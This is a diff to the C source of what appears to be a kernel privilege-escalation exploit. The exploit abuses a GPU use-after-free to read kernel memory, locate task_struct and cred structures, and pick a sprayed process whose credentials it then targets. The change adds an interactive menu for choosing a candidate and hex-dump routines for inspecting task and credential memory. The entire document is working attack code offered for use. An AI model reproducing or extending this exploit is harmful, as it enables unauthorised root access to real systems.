@@ -1748,6 +1748,26 @@ static int find_marker_in_page(uint8_t *page_data, size_t page_size, uint64_t cu
     return 0;
 }
 
+static void hex_dump_internal(const char *desc, uint64_t addr, uint8_t *data, size_t size) {
+    fprintf(stderr, "    --- %s at 0x%lx ---\n", desc, (unsigned long)addr);
+    for (size_t i = 0; i < size; i += 16) {
+        fprintf(stderr, "    %04lx: ", (unsigned long)i);
+        for (size_t j = 0; j < 16; j++) {
+            if (i + j < size) fprintf(stderr, "%02x ", data[i + j]);
+            else fprintf(stderr, "   ");
+        }
+        fprintf(stderr, " | ");
+        for (size_t j = 0; j < 16; j++) {
+            if (i + j < size) {
+                uint8_t c = data[i + j];
+                fprintf(stderr, "%c", (c >= 0x20 && c <= 0x7e) ? c : '.');
+            }
+        }
+        fprintf(stderr, "\n");
+    }
+    fprintf(stderr, "    ---------------------------------\n");
+}
+
 static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
 {
     unsigned int ctx_id = 0, ib_id = 0, dst_id = 0;
@@ -1883,30 +1903,50 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                                 (unsigned long)found_cred_ptr, 
                                 uids[0], uids[1], uids[2], uids[3], uids[4], uids[5], uids[6], uids[7]);
                         
-                        fprintf(stderr, "    [>] Use this candidate? (y/n): ");
-                        fflush(stderr);
-                        
-                        char c = 0;
-                        if (read(0, &c, 1) > 0) {
-                            if (c == 'y' || c == 'Y') {
-                                marker_found = 1;
-                                *(uint64_t *)&gbuf[GBUF_TASK_VA] = task_start_va;
-                                *(uint64_t *)&gbuf[GBUF_TARGET_PID] = found_pid;
-                                *(uint64_t *)&gbuf[GBUF_CRED_PTR] = found_cred_ptr;
-                                *(uint32_t *)&gbuf[GBUF_COMM_OFF] = off; 
-                                
-                                for (int si = 0; si < SPRAY_COUNT_MAX; si++) {
-                                    if (spray_ctrl[si].pid == found_pid) {
-                                        spray_ctrl[si].do_action = 1;
-                                        break;
+                        int user_decision = 0;
+                        while (!user_decision) {
+                            fprintf(stderr, "\n    [>] Actions: [y] Use candidate, [n] Skip, [1] Hexdump Task, [2] Detailed CRED: ");
+                            fflush(stderr);
+                            
+                            char choice = 0;
+                            if (read(0, &choice, 1) > 0) {
+                                // Clean up newline
+                                char dummy;
+                                while(read(0, &dummy, 1) > 0 && dummy != '\n');
+
+                                if (choice == 'y' || choice == 'Y') {
+                                    marker_found = 1;
+                                    *(uint64_t *)&gbuf[GBUF_TASK_VA] = task_start_va;
+                                    *(uint64_t *)&gbuf[GBUF_TARGET_PID] = found_pid;
+                                    *(uint64_t *)&gbuf[GBUF_CRED_PTR] = found_cred_ptr;
+                                    *(uint32_t *)&gbuf[GBUF_COMM_OFF] = off; 
+                                    
+                                    for (int si = 0; si < SPRAY_COUNT_MAX; si++) {
+                                        if (spray_ctrl[si].pid == found_pid) {
+                                            spray_ctrl[si].do_action = 1;
+                                            break;
+                                        }
+                                    }
+                                    fprintf(stderr, "\n[!!!] PROCEEDING with Task at 0x%lx\n", (unsigned long)task_start_va);
+                                    user_decision = 1;
+                                } else if (choice == 'n' || choice == 'N') {
+                                    fprintf(stderr, "    [-] Skipping candidate...\n");
+                                    user_decision = 1;
+                                } else if (choice == '1') {
+                                    uint8_t dump[512];
+                                    if (gpu_read_task_struct(fd, task_start_va + off - 256, dump, 512) == 0) {
+                                        hex_dump_internal("task_struct around marker", task_start_va + off - 256, dump, 512);
+                                    }
+                                } else if (choice == '2') {
+                                    uint8_t dump[256];
+                                    if (gpu_read_task_struct(fd, found_cred_ptr, dump, 256) == 0) {
+                                        hex_dump_internal("CRED structure", found_cred_ptr, dump, 256);
+                                        uint32_t *uids = (uint32_t *)dump;
+                                        fprintf(stderr, "    [CRED INFO] Usage: %u | UIDs: %u %u %u %u | GIDs: %u %u %u %u\n",
+                                                uids[0], uids[1], uids[2], uids[3], uids[4], uids[5], uids[6], uids[7], uids[8]);
                                     }
                                 }
-                                fprintf(stderr, "\n[!!!] PROCEEDING with Task at 0x%lx\n", (unsigned long)task_start_va);
-                            } else {
-                                fprintf(stderr, "    [-] Skipping...\n");
                             }
-                            char dummy;
-                            while(read(0, &dummy, 1) > 0 && dummy != '\n');
                         }
                     }
                 } else {
